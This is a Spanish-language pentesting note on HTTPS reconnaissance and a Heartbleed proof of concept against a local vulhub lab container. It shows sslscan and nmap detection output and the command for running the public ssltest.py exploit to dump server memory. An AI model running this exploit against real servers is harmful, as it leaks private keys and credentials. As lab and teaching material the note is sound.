
**HTTPS** (**Hypertext Transfer Protocol Secure**) es una **versión segura** de HTTP ([[80-http]]) que utiliza SSL / TLS para cifrar la comunicación entre el cliente y el servidor. Utiliza el puerto 443 por defecto. La principal diferencia entre HTTP y HTTPS es que HTTPS utiliza una capa de seguridad adicional para cifrar los datos, lo que los hace más seguros para la transferencia.

# Reconocimiento

A la hora de aplicar reconocimiento sobre una web, al igual que con [[80-http]], comenzamos con [[whatweb]] ó [[wappalizer]], para tratar de encontrar gestores de contenido ([[CMS]]) ó tecnologías que utilice la web. También es interesante echar un ojo al *certificado ssl* de la página, se puede hacer manualmente, *clickando* en *ver certificado* ó, con herramientas como [[sslyze]] ó [[sslscan]].

# POC

## Heartbleed

[[Heartbleed]] es una vulnerabilidad de seguridad que afecta a la biblioteca OpenSSL y permite a los atacantes acceder a la memoria de un servidor vulnerable. Si un servidor web es vulnerable a Heartbleed y lo detectamos a través de estas herramientas, esto significa que un atacante podría potencialmente acceder a información confidencial, como claves privadas, nombres de usuario y contraseñas, etc...

Utilizaremos el contenedor del siguiente [repo](https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160).

Si tratamos de acceder, solo veremos una frase que dirá `Heartbleed test`:

```bash
https://127.0.0.1:8443
```

Vamos a lanzar [[sslscan]]:

```bash
sslscan 127.0.0.1:8443
```
```sslscan
[...]
  Heartbleed:
TLSv1.2 vulnerable to heartbleed
TLSv1.1 vulnerable to heartbleed
TLSv1.0 vulnerable to heartbleed
[...]
```

Vemos entre otras cosas, que es sensible a [[Heartbleed]]. Podríamos también haber lanzado el script de [[nmap]] `ssl-heartbleed.nse`:

```bash
nmap --script ssl-heartbleed -p8443 127.0.0.1
```
```nmap
PORT     STATE SERVICE
8443/tcp open  https-alt
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
[...]
```
Vamos a ejecutar el exploit `ssltest.py` para dumpear info de la memoria, como habrá gran cantidad de bloques vacíos, concatenamos un [[grep]] para que no se muestren dichas líneas.

```bash
sudo python3 ssltest.py 127.0.0.1 -p 8443 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
```

En ocasiones, la info leída puede contener datos sensibles.